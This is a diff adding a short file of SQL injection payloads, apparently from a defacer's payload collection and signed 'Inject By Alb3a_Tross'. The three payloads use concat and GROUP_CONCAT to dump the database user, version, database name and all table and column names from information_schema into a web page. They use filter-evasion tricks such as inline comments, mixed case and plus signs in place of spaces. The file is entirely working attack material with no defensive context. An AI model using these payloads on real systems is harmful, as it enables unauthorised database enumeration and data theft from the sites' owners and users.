@@ -1,0 +1,13 @@
+concat('</title>','<br>','Inject By Alb3a_Tross','<br>','USERNAME==>',user(),'<br>','VERSION==>',version/**_**/(),'<br>','DATABASE==>',database(),'<br>','<br>',table_name,' :: ',column_name)
+
+
+from /*!information_Schema.columns*/
+
+
+
+concat('</title><b><i><li><h1>Inject By Alb3a_Tross</h1><li>',@@version,'<li>', database(),'<li>',user(),'<br><br>',(SELECT+GROUP_CONCAT('<li>',table_name,' >>> ',column_name)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA=DATABASE()))
+
+
+Concat+('Inject By Alb3a_Tross','<br>',GrOup_ConCat('<br>',Table_name,' :: ',column_name))
+
+from information_schema.columns where table_schema=database()
